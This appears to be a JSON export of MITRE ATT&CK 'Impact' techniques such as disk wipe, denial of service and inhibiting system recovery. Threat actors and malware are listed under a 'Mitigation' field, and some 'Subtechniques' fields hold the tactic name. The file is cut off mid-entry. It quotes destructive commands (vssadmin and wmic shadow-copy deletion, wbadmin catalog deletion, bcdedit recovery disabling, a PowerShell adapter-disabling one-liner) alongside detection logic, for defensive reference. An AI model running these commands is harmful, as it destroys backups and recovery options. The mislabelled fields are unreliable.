        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access internal and external websites and services). Consider correlating with application monitoring for indication of unplanned service interruptions or unauthorized content changes."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1491.001",
        "name": "Internal Defacement"
      },
      {
        "id": "T1491.002",
        "name": "External Defacement"
      }
    ],
    "Tactic": "\nImpact"
  },
  {
    "Title": "Disk Wipe",
    "Code": "T1561",
    "Description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[1]On network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as erase.[2]",
    "Mitigation": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.[3] Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for direct access read/write attempts using the \\\\.\\ notation.[4] Monitor for unusual kernel driver installation activity."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Access",
        "detects": "Monitor for newly constructed drive letters or mount points to a data storage device for attempts to write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Drive Modification",
        "detects": "Monitor for changes made to drive letters or mount points of data storage devices for attempts to read to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual kernel driver installation activity that may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1561.001",
        "name": "Disk Content Wipe"
      },
      {
        "id": "T1561.002",
        "name": "Disk Structure Wipe"
      }
    ],
    "Tactic": "\nImpact"
  },
  {
    "Title": "Endpoint Denial of Service",
    "Code": "T1499",
    "Description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes[1] and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.[4]In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.[5]For attacks attempting to saturate the providing network, see Network Denial of Service.",
    "Mitigation": [
      {
        "id": "S0052",
        "name": "OnionDuke",
        "description": "OnionDuke has the capability to use a Denial of Service module.[6]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.[7]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has a feature to perform SYN flood attack on a host.[8][9]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt. Externally monitor the availability of services that may be targeted by an Endpoint DoS."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1499.001",
        "name": "OS Exhaustion Flood"
      },
      {
        "id": "T1499.002",
        "name": "Service Exhaustion Flood"
      },
      {
        "id": "T1499.003",
        "name": "Application Exhaustion Flood"
      },
      {
        "id": "T1499.004",
        "name": "Application or System Exploitation"
      }
    ],
    "Tactic": "\nImpact"
  },
  {
    "Title": "Financial Theft",
    "Code": "T1657",
    "Description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,[1] business email compromise (BEC) and fraud,[2] \"pig butchering,\"[3] bank hacking,[4] and exploiting cryptocurrency networks.[5] Adversaries may Compromise Accounts to conduct unauthorized transfers of funds.[6] In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.[2] This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.[7]Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact [8] and Exfiltration of data, followed by threatening public exposure unless payment is made to the adversary.[9]Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption.[10]",
    "Mitigation": [
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions.[11]"
      },
      {
        "id": "G0083",
        "name": "SilverTerrier",
        "description": "SilverTerrier targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.[12][13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Review and monitor financial application logs for signs of financial theft, such as abnormal monetary transactions or resource balances.Email logs may also highlight account takeovers, impersonation, or another activity that may enable monetary theft."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Firmware Corruption",
    "Code": "T1495",
    "Description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.[1] Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.[2][3] Depending on the device, this attack may also result in Data Destruction.",
    "Mitigation": [
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit has used an executable that installs a modified bootloader to prevent normal boot-up.[4]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot module \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0001",
        "dsource": "Firmware",
        "dcomp": "Firmware Modification",
        "detects": "Monitor for changes made to the firmware for unexpected modifications to settings and/or data. [6] Log attempts to read/write to BIOS and compare against known patching behavior."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Inhibit System Recovery",
    "Code": "T1490",
    "Description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.[1][2] This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.[1][2] Furthermore, adversaries may disable recovery notifications, then corrupt backups.[3]A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quietWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy deletewbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quietbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled noREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected systemOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.Adversaries may also delete \"online\" backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.[4] In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.[5][6]",
    "Mitigation": [
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon deletes backups and shadow copies using native system tools.[7][8]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk has the ability to delete shadow volumes using vssadmin.exe delete shadows /all /quiet.[9][10]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer attempts to remove the backup shadow files from the host using vssadmin.exe Delete Shadows /All /Quiet.[11]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can delete shadow copies using vssadmin.exe.[12][13][14][15][16][17][18][19][19][20]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can delete shadow copies using vssadmin.exe delete shadows /all /quiet and wmic.exe Shadowcopy Delete; it can also modify the boot loader using bcdedit /set {default} recoveryenabled No.[21]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can delete the shadow volumes with vssadmin Delete Shadows /all /quiet and can use bcdedit to disable recovery options.[22]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker resets system restore points and deletes backup files.[23]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can delete Windows Volume Shadow Copies using vssadmin.[24]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can delete shadow volumes using vssadmin.exe.[25]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM can delete volume shadow copies on compromised hosts.[26]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can delete shadow copies using the IVssBackupComponents COM object to call the DeleteSnapshots method.[27]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS removes backups of Volume Shadow Copies to disable any restoration capabilities.[28][29]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.[26][30]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 disable recovery options and deletes shadow copies from the victim.[31]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY can delete volume shadow copies on compromised hosts.[26]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can disable the VSS service on a compromised host using the service control manager.[32][33][34]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can can remove all system restore points.[35]"
      },
      {
        "id": "S0389",
        "name": "JCry",
        "description": "JCry has been observed deleting shadow copies to ensure that data cannot be restored easily.[36]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.[37][38]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex has deleted volume shadow copies using vssadmin.exe.[39]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can use bcdedit to delete different boot identifiers on a compromised host; it can also use vssadmin.exe delete shadows /all /quiet and C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete.[40]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can delete the infected system's Shadow Volumes to prevent recovery.[41][42]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer uses the native Windows utilities vssadmin, wbadmin, and bcdedit to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.[1]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige can delete the backup catalog from the target system using: c:\\Windows\\System32\\wbadmin.exe delete catalog -quiet and can also delete volume shadow copies using: \\Windows\\System32\\vssadmin.exe delete shadows /all /quiet.[43]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can use vssadmin.exe to remove volume shadow copies.[44]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa has the functionality to delete shadow copies.[45]"
      },
      {
        "id": "S0481",
        "name": "Ragnar Locker",
        "description": "Ragnar Locker can delete volume shadow copies using vssadmin delete shadows /all /quiet.[46]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.[47][48][49][50][51][52][53][54][55]"
      },
      {
        "id": "S0400",
        "name": "RobbinHood",
        "description": "RobbinHood deletes shadow copies to ensure that all the data cannot be restored easily.[56]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can delete shadow copy backups with vssadmin.exe using the command delete shadows /all /quiet.[57][58][59]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[60]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry uses vssadmin, wbadmin, bcdedit, and wmic to delete and disable operating system recovery features.[61][2][62]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can delete shadow volumes.[63][64][65]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin.[66]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Deletion",
        "detects": "Monitor for unexpected deletion of a cloud storage objects (ex: AWS delete-object), especially those associated with cloud backups."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Deletion",
        "detects": "The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. After compromising a network of systems, threat actors often try to delete/resize Shadow Copy in an attempt to prevent administrators from restoring the systems to versions present before the attack. This is often done via vssadmin, a legitimate Windows tool to interact with shadow copies. This action is often employed by ransomware, may lead to a failure in recovering systems after an attack. The pseudo code detection focus on Windows Security and Sysmon process creation (4688 and 1). The use of wmic to delete shadow copy generates WMI-Activity Operationnal 5857 event and could generate 5858 (if the operation fails). These 2 EventIDs could be interesting when attackers use wmic without process creation and/or for forensics.Analytic 1 - Detecting Shadow Copy Deletion or Resizedeleted_copy = filter processes where ((event_id =\"4688\" OR event_id =\"1\") (CommandLine=\"vssadmin delete shadows\" OR CommandLine=\"wmic shadowcopy delete\" OR CommandLine=\"vssadmin resize shadowstorage\")) OR (event_id =\"5857\" ProviderName=\"MSVSS__PROVIDER\") OR (event_id =\"5858\" Operation=\"Win32_ShadowCopy\")Analytic 2 - BCDEdit Failure Recovery Modificationbcdedit_commands = filter processes where (  exe = \"C:\\Windows\\System32\\bcdedit.exe\" AND command_line=\"recoveryenabled\" )"
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Monitor the status of services involved in system recovery.Note: For Windows, Event ID 7040 can be used to alert on changes to the start type of a service (e.g., going from enabled at startup to disabled) associated with system recovery."
      },
      {
        "id": "DS0020",
        "dsource": "Snapshot",
        "dcomp": "Snapshot Deletion",
        "detects": "Monitor for unexpected deletion of snapshots (ex: AWS delete-snapshot), especially those associated with cloud backups."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor the registry for changes associated with system recovery features (ex: the creation of HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage)."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Network Denial of Service",
    "Code": "T1498",
    "Description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes[1] and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.[4]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1498.001",
        "name": "Direct Network Flood"
      },
      {
        "id": "T1498.002",
        "name": "Reflection Amplification"
      }
    ],
    "Tactic": "\nImpact"
  },
  {
    "Title": "Resource Hijacking",
    "Code": "T1496",
    "Description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.[1] Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.[2] Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.[3][4]Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.[5]Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents.[6] Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.[7]",
    "Mitigation": [
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment.[8]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems.[9]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan can download an additional module which has a cryptocurrency mining extension.[10]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner has loaded coinmining software onto systems to mine for Koto cryptocurrency. [11]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used xmrig to mine cryptocurrency.[3]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine.[12]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has created and run a Bitcoin cryptocurrency miner.[13][14]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.[15]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.[16]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has distributed cryptomining malware.[17][18]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap is a kernel-mode rootkit used for cryptocurrency mining.[19]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has deployed XMRig Docker images to mine cryptocurrency.[20][21] TeamTNT has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may indicate common cryptomining or proxyware functionality."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for common cryptomining or proxyware files on local systems that may indicate compromise and resource usage."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts, look for connections to/from strange ports, as well as reputation of IPs and URLs related cryptocurrency hosts. Note: Destination Host Name is not a comprehensive list of potential cryptocurrency URLs. Analytic 1 - Suspicious Port Connectionssuspicious_netcoms = filter network traffic where ((src_port = \"3333\" OR src_port = \"4444\" OR src_port = \"5555\" OR src_port = \"6666\") AND (dst_host_name = \"cryptmonero.com\" OR dst_host_name = \"crypto-pool.fr\" OR dst_host_name = \"crypto-pool.info\" OR dst_host_name = \"cryptonight-hub.miningpoolhub.com\"))"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for common cryptomining or proxyware software process names that may indicate compromise and resource usage."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "Service Stop",
    "Code": "T1489",
    "Description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.[1][2] Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible [2]. In some cases, adversaries may stop or disable many or all services to render systems unusable.[1] Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.[3]",
    "Mitigation": [
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon looks for and attempts to stop database processes.[4]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has terminated specific processes before encryption.[5]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can stop specific services related to backups.[6][7][8]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability to stop VM services on compromised networks.[9][10]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can kill several processes and services related to backups and security solutions.[11][12]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of net stop.[13]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba has a hardcoded list of services and processes to terminate.[14]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol will terminate services using the Service Control Manager (SCM) API.[15]"
      },
      {
        "id": "S0605",
        "name": "EKANS",
        "description": "EKANS stops database, data backup solution, antivirus, and ICS-related processes.[16][17][18]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper has the ability to stop the Volume Shadow Copy service.[19]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to stop services on the infected host.[20]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has used PsExec to stop services prior to the execution of ransomware.[21]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer’s data wiper module writes zeros into the registry keys in SYSTEM\\CurrentControlSet\\Services to render a system inoperable.[22]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk terminates various processes to get the user to reboot the victim machine.[23]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure.[24]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.[25]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can kill processes and delete services.[26]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has stopped SQL services to ensure it can encrypt any database.[27]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex can stop and disable services on the system.[28]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can disconnect all network adapters on a compromised host using powershell -Command \"Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }\" > NUL.[29]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can terminate system processes and services, some of which relate to backup software.[30]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer uses the API call ChangeServiceConfigW to disable all services on the affected system.[1]"
      },
      {
        "id": "S0556",
        "name": "Pay2Key",
        "description": "Pay2Key can stop the MS SQL service at the end of the encryption process to release files locked by the service.[31]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige has attempted to stop the MSSQL Windows service to ensure successful encryption using C:\\Windows\\System32\\net.exe stop MSSQLSERVER.[32]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa can stop services and processes.[33]"
      },
      {
        "id": "S0481",
        "name": "Ragnar Locker",
        "description": "Ragnar Locker has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted.[34]"
      },
      {
        "id": "S0496",
        "name": "REvil",
